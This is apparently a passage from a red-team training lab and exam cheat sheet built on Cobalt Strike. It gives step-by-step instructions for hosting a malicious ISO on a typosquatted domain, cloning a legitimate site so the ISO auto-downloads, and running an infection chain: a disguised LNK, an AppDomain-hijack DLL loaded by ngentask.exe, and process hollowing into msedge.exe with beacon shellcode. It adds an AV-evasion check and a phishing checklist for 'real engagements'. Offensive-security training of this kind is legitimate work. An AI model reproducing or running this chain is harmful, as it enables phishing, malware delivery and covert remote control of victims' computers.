1. Host the ISO on Cobalt Strike's built-in web server.
  1. Go to **Site Management > Host File**.
  2. File: ```C:\Payloads\deals\deals.iso```
  3. Local URI: ```/deals.iso```
  4. Local Host: ```www.bleepincomputer.com```
  5. Click **Launch**.

> **What this does:** CS's team server begins serving `deals.iso` at
> `http://www.bleepincomputer.com/deals.iso`. Any request to that URI returns the ISO file.

1. Clone a legitimate web page.
  1. **Go to Site Management > Clone Site** 
  1. Clone URL: ```https://deals.bleepingcomputer.com```
  2. Local URI: ```/deals```
  3. Local Host: ```www.bleepincomputer.com```
  4. Attack: Click the **...** button and select the hosted ISO.
  5. Click **Clone**.

> **What this does:** CS fetches the real `https://deals.bleepingcomputer.com` content and
> serves a copy at `http://www.bleepincomputer.com/deals`. The "Attack" field links the
> hosted ISO to this page — when the victim visits `/deals`, the ISO begins downloading
> automatically alongside the legitimate-looking page content.

<img src="/images/initial-access-lab-08.png" width=1024>  

1. Switch over to @lab.VirtualMachine(lon-wkstn-1).SelectLink and login with ```@lab.VirtualMachine(lon-wkstn-1).Password```.

1. Open Microsoft Edge and browse to ```http://www.bleepincomputer.com/deals```
1. Click *Open file* when deals.iso downloads.
1. Double-click on *deals.xlsx* and the decoy will open.
1. Switch back to @lab.VirtualMachine(attacker-desktop).SelectLink and a Beacon should be checking in from msedge.exe, as the user pchilds.

> **What just happened — the full chain:**
> 1. Victim browsed to cloned bleepingcomputer page → ISO auto-downloaded
> 2. Victim mounted the ISO → saw only `deals.xlsx.lnk` (looks like a spreadsheet)
> 3. Victim double-clicked → `cmd.exe` ran → PowerShell set APPDOMAIN env vars → `ngentask.exe` executed
> 4. .NET runtime loaded `AppDomainHijack.dll` → `InitializeNewDomain()` fired
> 5. `msedge.exe` spawned suspended → process hollowed with beacon shellcode → thread resumed
> 6. Beacon checked in from `msedge.exe` running as the victim user (`pchilds`)
> 7. Victim saw the decoy `deals.xlsx` spreadsheet — nothing appeared to go wrong

⚠️ In this lab you have created an initial access infection chain, leveraging DLL sideloading with ngentask.exe.  

---

## Exam Day Summary — What You Actually Do

```
EXAM (assume-breach — direct workstation access):
─────────────────────────────────────────────────
On attacker Windows dev box:
  1. Generate raw shellcode → CS → Payloads → Windows Stageless Payload → Raw → http_x64.xprocess.bin
  2. Build AppDomainHijack.dll in VS (Release, .NET Framework)
  3. ThreatCheck.exe -f AppDomainHijack.dll  → must be clean
  4. Copy AppDomainHijack.dll to delivery location (CS web server or USB/share)
  5. Copy ngentask.exe from WinSxS to same location

On exam foothold workstation (logged in with provided creds):
  6. Copy AppDomainHijack.dll and ngentask.exe to a working directory (e.g. C:\Windows\Temp\)
  7. Open PowerShell
  8. cd to the directory containing both files
  9. $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
     $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
  10. .\ngentask.exe
  11. Beacon checks in from msedge.exe → confirm getuid, ps

REAL ENGAGEMENT (phishing — no direct access):
───────────────────────────────────────────────
Steps 1–5 above PLUS:
  6. Create decoy (deals.xlsx)
  7. Build LNK trigger (deals.xlsx.lnk with cmd→powershell→ngentask chain)
  8. PackMyPayload → ISO (hide DLL, ngentask, xlsx — show only LNK)
  9. CS Site Management → Host ISO → Clone legitimate site with ISO as attack payload
  10. Social engineer victim to visit URL → ISO downloads → victim mounts + clicks LNK → beacon
```
